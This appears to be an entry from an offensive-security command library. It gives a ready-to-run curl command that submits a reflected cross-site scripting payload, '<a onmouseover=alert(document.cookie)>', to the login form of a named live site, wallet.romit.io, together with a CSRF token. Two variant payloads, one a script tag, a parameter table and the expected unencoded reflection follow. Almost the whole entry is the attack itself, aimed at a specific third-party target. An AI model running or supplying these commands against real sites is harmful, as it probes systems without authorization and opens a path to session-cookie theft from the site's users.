---
id: cmd-submit-xss-login
data: >-
  curl -X POST https://wallet.romit.io/login -d "email[]=<a
  onmouseover=alert(document.cookie)>xxs
  link</a>&password=g00dPa%24%24w0rD&_csrf=5afeda5f-e604-4ba0-bd60-d83f975853c5"
  -H "Content-Type: application/x-www-form-urlencoded"
tags:
  - xss
  - post
type: command
output: null
executor: curl
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:35.275Z'
verified: false
validated: true
submitted: true
---
# Submit XSS Login Payload

## Command

```bash
curl -X POST https://wallet.romit.io/login \
  -d "email[]=<a onmouseover=alert(document.cookie)>xxs link</a>&password=g00dPa%24%24w0rD&_csrf=5afeda5f-e604-4ba0-bd60-d83f975853c5" \
  -H "Content-Type: application/x-www-form-urlencoded"
```

## Description

Sends a POST request to the login endpoint with an XSS payload in the email parameter, using a dummy password and CSRF token to simulate form submission and trigger reflection.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-d` | POST data string with payload | Yes |
| `email[]` | Injected XSS payload | Yes |
| `password` | Dummy value to complete form | Yes |
| `_csrf` | Form token to bypass protection | Yes |
| `-H` | Sets content type header | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://wallet.romit.io/login -d "email[]=<a onmouseover=alert(1)>test</a>&password=test&_csrf=token" -H "Content-Type: application/x-www-form-urlencoded"
```

### Advanced Usage

```bash
curl -X POST https://wallet.romit.io/login -d "email[]=<script>alert('XSS')</script>&password=pass&_csrf=token" -H "Content-Type: application/x-www-form-urlencoded" -v
```

## Expected Output

HTTP response with HTML error page containing the reflected payload, e.g., body including '<a onmouseover=alert(document.cookie)>xxs link</a>' unencoded.

## Related

- [[Related Procedure: Submit POST Request with XSS Payload]]
